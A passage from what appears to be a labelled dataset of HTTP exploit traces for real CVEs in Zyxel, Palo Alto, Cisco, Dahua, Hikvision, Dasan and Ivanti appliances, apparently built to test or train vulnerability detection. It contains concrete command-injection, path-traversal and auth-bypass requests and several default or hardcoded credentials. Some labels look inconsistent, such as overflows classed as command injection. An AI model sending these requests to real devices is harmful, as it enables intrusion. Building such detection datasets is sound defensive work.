        "vendor": "Zyxel",
        "product": "EMG2926",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/adv,/cgi-bin/webproc",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46MTIzNA=="},
                "body": "getpage=html/index.html&var:sys_cmd=cat /etc/passwd&var:page=*"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "sys_cmd",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/43105",
            "reasoning": "webproc cgi passes var:sys_cmd to system(). Requires auth. EMG2926 router."
        }
    },
    {
        "cve_id": "CVE-2020-29583",
        "vendor": "Zyxel",
        "product": "Multiple Products",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ztp/cgi-bin/handler",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"result\":\"0\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-29583",
            "reasoning": "Hardcoded credentials (username: zyfwp, password: PrOw!aN_fXp) in firmware. USG/ATP/VPN/NXC series. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2020-9054",
        "vendor": "Zyxel",
        "product": "Multiple NAS Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/adv,/cgi-bin/weblogin.cgi",
                "params": {"username": "admin';cat /etc/passwd'"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "username",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/48085",
            "reasoning": "weblogin.cgi username parameter passed to shell. Pre-auth RCE. NAS326, NAS520, NAS540, NAS542. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2022-30525",
        "vendor": "Zyxel",
        "product": "Multiple Firewalls",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ztp/cgi-bin/handler",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\";cat /etc/passwd;\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "mtu",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/50986",
            "reasoning": "ZTP handler passes mtu parameter to OS command. Pre-auth. Affects USG FLEX, ATP, VPN, USG 100-700. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2023-27992",
        "vendor": "Zyxel",
        "product": "Multiple NAS Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cmd,/simZy498317498,/CGI_MAIN",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "c0=FIRMWARE_UPDATE&path=;cat /etc/passwd;"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "path",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-27992",
            "reasoning": "Pre-auth command injection in NAS firmware update functionality. Affects NAS326, NAS540, NAS542. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2023-33009",
        "vendor": "Zyxel",
        "product": "Multiple Firewalls",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ztp/cgi-bin/handler",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"command\":\"setWanPortSt\",\"data\":\"" + "A" * 4096 + "\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "data",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-33009",
            "reasoning": "Buffer overflow in notification function. Pre-auth. Affects ATP, USG FLEX, VPN, ZyWALL/USG firewalls."
        }
    },
    {
        "cve_id": "CVE-2023-33010",
        "vendor": "Zyxel",
        "product": "Multiple Firewalls",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ztp/cgi-bin/handler",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"command\":\"setWanPortSt\",\"id\":\"" + "A" * 4096 + "\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "id",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-33010",
            "reasoning": "Buffer overflow in ID processing function. Pre-auth. Affects ATP, USG FLEX, VPN, ZyWALL/USG firewalls."
        }
    },
    {
        "cve_id": "CVE-2024-11667",
        "vendor": "Zyxel",
        "product": "Multiple Firewalls",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/export-cgi/../../../../../../etc/passwd",
                "params": {},
                "headers": {"Cookie": "SESS_ID=valid_session"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-11667",
            "reasoning": "Directory traversal in web management interface. Authenticated attacker can download/upload arbitrary files. ATP, USG FLEX, USG FLEX 50(W)/USG20(W)-VPN series."
        }
    },
    {
        "cve_id": "CVE-2024-40890",
        "vendor": "Zyxel",
        "product": "DSL CPE Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/ViewLog.asp",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic c3VwZXJ2aXNvcjp6eUFkMTIzNA=="},
                "body": "remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&remote_host=;cat /etc/passwd;"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "remote_host",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-40890",
            "reasoning": "Post-auth command injection in ViewLog.asp. Similar to CVE-2017-18368 but requires auth. Zyxel DSL CPE VMG/SBG series. Default creds supervisor:zyAd1234."
        }
    },
    # ===== Palo Alto Networks (10) =====
    {
        "cve_id": "CVE-2017-15944",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/esp/cms_change498498Device498Group.esp",
                "params": {"device": "test'; cat /etc/passwd'"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "device",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/43342",
            "reasoning": "Chained vulnerabilities: auth bypass + directory traversal + command injection in PAN-OS management interface. Pre-auth RCE."
        }
    },
    {
        "cve_id": "CVE-2019-1579",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/sslmgr",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "scep-profile-name=%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s"
            },
            "response": {
                "status_code": 200,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "scep-profile-name",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/47382",
            "reasoning": "Format string vulnerability in GlobalProtect SSL VPN sslmgr. Pre-auth RCE via scep-profile-name parameter. PAN-OS GlobalProtect."
        }
    },
    {
        "cve_id": "CVE-2020-2021",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/SAML/SSO/LOGIN",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "SAMLResponse=<crafted_saml_response>"
            },
            "response": {
                "status_code": 302,
                "headers": {"Location": "/php/login.php"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "SAMLResponse",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-2021",
            "reasoning": "SAML authentication bypass when Security Assertion Markup Language is enabled and 'Validate Identity Provider Certificate' is disabled. CVSS 10.0."
        }
    },
    {
        "cve_id": "CVE-2024-0012",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/php/ztp_gate.php",
                "params": {},
                "headers": {"X-PAN-AUTHCHECK": "off"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "admin interface"
            }
        },
        "ground_truth": {
            "sink_param": "X-PAN-AUTHCHECK",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-0012",
            "reasoning": "Setting X-PAN-AUTHCHECK header to 'off' bypasses authentication on management interface. Pre-auth admin access. PAN-OS. CVSS 9.3."
        }
    },
    {
        "cve_id": "CVE-2024-3400",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ssl-vpn/hipreport.esp",
                "params": {},
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`cat /etc/passwd`"
                },
                "body": ""
            },
            "response": {
                "status_code": 200,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "SESSID",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-3400",
            "reasoning": "Path traversal + command injection in GlobalProtect. SESSID cookie value used to create file path, backtick content executed. Pre-auth RCE. CVSS 10.0."
        }
    },
    {
        "cve_id": "CVE-2024-9474",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/php/utils/createRemoteApp498498web498498498498498498.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "app=test&type=plugin&url=http://example.com/;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "url",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-9474",
            "reasoning": "OS command injection in PAN-OS management interface. Authenticated admin privilege escalation to root. Chained with CVE-2024-0012."
        }
    },
    {
        "cve_id": "CVE-2025-0108",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/unauth/php/ztp_gate.php/PAN_help/",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "phpinfo()"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-0108",
            "reasoning": "Auth bypass via path confusion between Nginx and Apache in PAN-OS. Unauthenticated access to admin PHP scripts. Chained with CVE-2024-9474 for RCE."
        }
    },
    {
        "cve_id": "CVE-2022-0028",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-0028",
            "reasoning": "URL filtering misconfiguration allows reflected amplification DoS. Attacker sends crafted requests that PAN-OS amplifies against target."
        }
    },
    {
        "cve_id": "CVE-2024-3393",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-3393",
            "reasoning": "DNS Security feature malformed DNS packet causes firewall reboot. DoS via crafted DNS traffic through data plane."
        }
    },
    {
        "cve_id": "CVE-2025-0111",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/?type=op&cmd=<show><system><info></info></system></show>",
                "params": {},
                "headers": {"X-PAN-KEY": "valid_api_key"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/xml"},
                "body": "<response><result><system><hostname>firewall</hostname></system></result></response>"
            }
        },
        "ground_truth": {
            "sink_param": "cmd",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-0111",
            "reasoning": "Authenticated file read via PAN-OS management interface. Allows reading sensitive files on the system. Chained with CVE-2025-0108."
        }
    },
    # ===== Cisco (selected well-known) =====
    {
        "cve_id": "CVE-2023-20198",
        "vendor": "Cisco",
        "product": "IOS XE",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/webui/logoutconfirm.html?logon_hash=1",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "username=cisco_tac_admin&password=cisco_tac_admin&submit=Log+In"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "Logged in"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-20198",
            "reasoning": "IOS XE Web UI privilege escalation. Unauthenticated attacker creates admin account. Cisco Talos observed mass exploitation. CVSS 10.0."
        }
    },
    {
        "cve_id": "CVE-2023-20273",
        "vendor": "Cisco",
        "product": "IOS XE",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/webui/logoutconfirm.html?logon_hash=1",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic Y2lzY29fdGFjX2FkbWluOmNpc2NvX3RhY19hZG1pbg=="},
                "body": "cmd=show version"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "Cisco IOS XE Software"
            }
        },
        "ground_truth": {
            "sink_param": "cmd",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-20273",
            "reasoning": "Post-auth command injection in IOS XE Web UI. Used in combination with CVE-2023-20198 for implant deployment."
        }
    },
    {
        "cve_id": "CVE-2019-1653",
        "vendor": "Cisco",
        "product": "RV320/RV325 Routers",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/config.exp",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "username=cisco\npassword=cisco123"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/46262",
            "reasoning": "Unauthenticated config export via /cgi-bin/config.exp leaks credentials. Cisco RV320 and RV325 routers."
        }
    },
    {
        "cve_id": "CVE-2019-1652",
        "vendor": "Cisco",
        "product": "RV320/RV325 Routers",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/certificate_handle2.htm",
                "params": {},
                "headers": {"Content-Type": "multipart/form-data; boundary=----FormBoundary", "Authorization": "Basic Y2lzY286Y2lzY28="},
                "body": "------FormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cert.pem\"\r\nContent-Type: application/x-pem-file\r\n\r\n-----BEGIN CERTIFICATE-----\r\n$(cat /etc/passwd)\r\n-----END CERTIFICATE-----\r\n------FormBoundary--"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "file",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/46243",
            "reasoning": "Authenticated command injection via certificate upload. RV320/RV325 routers. Chained with CVE-2019-1653."
        }
    },
    {
        "cve_id": "CVE-2020-3452",
        "vendor": "Cisco",
        "product": "ASA/FTD",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/+CSCOT+/translation-table",
                "params": {"type": "mst", "textdomain": "/+CSCOE+/portal_full.html", "default-language": "", "lang": "../"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "<!DOCTYPE html><html>portal content</html>"
            }
        },
        "ground_truth": {
            "sink_param": "textdomain",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/48722",
            "reasoning": "Path traversal in Cisco ASA/FTD web services via translation-table. Read-only access to WebVPN filesystem. CVSS 7.5."
        }
    },
    {
        "cve_id": "CVE-2018-0296",
        "vendor": "Cisco",
        "product": "ASA",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/+CSCOU+/../+CSCOE+/files/file_list.json",
                "params": {"path": "/"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"files\":[\"portal.html\",\"logon.html\"]}"
            }
        },
        "ground_truth": {
            "sink_param": "path",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/44956",
            "reasoning": "Directory traversal in ASA web interface. Enumerate files and directories. Can cause DoS by accessing certain paths. CVSS 7.5."
        }
    },
    {
        "cve_id": "CVE-2018-0125",
        "vendor": "Cisco",
        "product": "VPN Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/config.exp",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "submit_button=Diagnostics&change_action=gozila_cgi&ping_ip=127.0.0.1;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "ping_ip",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-0125",
            "reasoning": "Buffer overflow in web-based management interface of Cisco RV132W and RV134W routers. Unauthenticated RCE."
        }
    },
    {
        "cve_id": "CVE-2020-3161",
        "vendor": "Cisco",
        "product": "IP Phones",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/osd/" + "A" * 1024,
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-3161",
            "reasoning": "Buffer overflow in web server of Cisco IP Phone 7800/8800 series via oversized URL. Pre-auth RCE."
        }
    },
    {
        "cve_id": "CVE-2023-20118",
        "vendor": "Cisco",
        "product": "RV Series Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/userLogin.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "username=cisco&password=cisco&submit=Login&gui_action=Apply&todo=ping&ping_ip=127.0.0.1;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "ping_ip",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-20118",
            "reasoning": "Authenticated RCE in RV016, RV042, RV042G, RV082, RV320, RV325 routers via web management interface command injection."
        }
    },
    {
        "cve_id": "CVE-2015-0666",
        "vendor": "Cisco",
        "product": "Prime DCNM",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/fm/fmrest/dbg/getfile/../../../../../../etc/passwd",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/36073",
            "reasoning": "Directory traversal in Cisco Prime Data Center Network Manager. Unauthenticated arbitrary file read via fmrest API."
        }
    },
    # ===== Dahua (2) =====
    {
        "cve_id": "CVE-2021-33044",
        "vendor": "Dahua",
        "product": "IP Camera",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/RPC2_Login",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\",\"password\":\"\",\"clientType\":\"NetKeyboard\",\"loginType\":\"Direct\"},\"id\":1}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"result\":true,\"session\":\"abc123\"}"
            }
        },
        "ground_truth": {
            "sink_param": "clientType",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-33044",
            "reasoning": "Identity authentication bypass by setting clientType to NetKeyboard in login request. Empty password accepted. Dahua IPC/VTH/NVR firmware."
        }
    },
    {
        "cve_id": "CVE-2021-33045",
        "vendor": "Dahua",
        "product": "IP Camera",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/RPC2_Login",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\",\"password\":\"\",\"clientType\":\"NetKeyboard\",\"loginType\":\"Direct\",\"authorityType\":\"OldDigest\"},\"id\":1}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"result\":true,\"session\":\"abc123\"}"
            }
        },
        "ground_truth": {
            "sink_param": "authorityType",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-33045",
            "reasoning": "Authentication bypass by specifying OldDigest authorityType. Downgrade attack on authentication mechanism. Dahua firmware."
        }
    },
    # ===== Hikvision (1) =====
    {
        "cve_id": "CVE-2017-7921",
        "vendor": "Hikvision",
        "product": "Multiple Products",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/Security/users",
                "params": {"auth": "YWRtaW46MTEK"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/xml"},
                "body": "<?xml version=\"1.0\"?><UserList><User><userName>admin</userName><password>admin123</password></User></UserList>"
            }
        },
        "ground_truth": {
            "sink_param": "auth",
            "payload_encoding": "base64",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/44407",
            "reasoning": "Improper authentication allows bypassing user management. auth parameter with base64 admin:11 grants access to user list with passwords. Hikvision cameras and NVRs."
        }
    },
    # ===== Dasan/GPON (2) =====
    {
        "cve_id": "CVE-2018-10561",
        "vendor": "Dasan",
        "product": "GPON Router",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/GponForm/diag_Form?images/",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;cat /etc/passwd;&ipv=0"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "dest_host",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/44576",
            "reasoning": "Auth bypass via appending ?images/ to URL + command injection in ping dest_host parameter. GPON ONU routers. Actively exploited by botnets."
        }
    },
    {
        "cve_id": "CVE-2018-10562",
        "vendor": "Dasan",
        "product": "GPON Router",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/GponForm/diag_Form?images/",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;cat /etc/passwd;&ipv=0"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "dest_host",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/44576",
            "reasoning": "Command injection stored and executed via diag_Form. Output viewable via /diag.html?images/ page. Linked with CVE-2018-10561 auth bypass."
        }
    },
    # ===== Ivanti / Pulse Secure (selected) =====
    {
        "cve_id": "CVE-2019-11510",
        "vendor": "Ivanti",
        "product": "Pulse Connect Secure",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd",
                "params": {"/dana/html5acc/guacamole/": ""},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/47297",
            "reasoning": "Pre-auth path traversal reads arbitrary files. Can extract /data/runtime/mtmp/lmdb/dataa/data.mdb for cached credentials. CVSS 10.0. Massively exploited."
        }
    },
    {
        "cve_id": "CVE-2019-11539",
        "vendor": "Ivanti",
        "product": "Pulse Connect Secure",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/dana/fb/smb/wfb.cgi",
                "params": {"laession": "test", "last": "test", "usr": "test", "dev": "test", "type": "test", "txtBkSession=`cat /etc/passwd`": ""},
                "headers": {"Cookie": "DSID=valid_session"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "txtBkSession",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-11539",
            "reasoning": "Post-auth command injection via admin web interface. Backtick injection in txtBkSession parameter. Pulse Connect Secure and Policy Secure."
        }
    },
    {
        "cve_id": "CVE-2024-21887",
        "vendor": "Ivanti",
        "product": "Connect Secure",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "Cookie": "DSID=valid_session"
                },
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"result\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-21887",
            "reasoning": "Authenticated command injection in web component. Path traversal to reach admin API from user context. Chained with CVE-2023-46805 for pre-auth RCE. CVSS 9.1."
        }
    },
    {
        "cve_id": "CVE-2023-46805",
        "vendor": "Ivanti",
        "product": "Connect Secure",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
                "params": {},
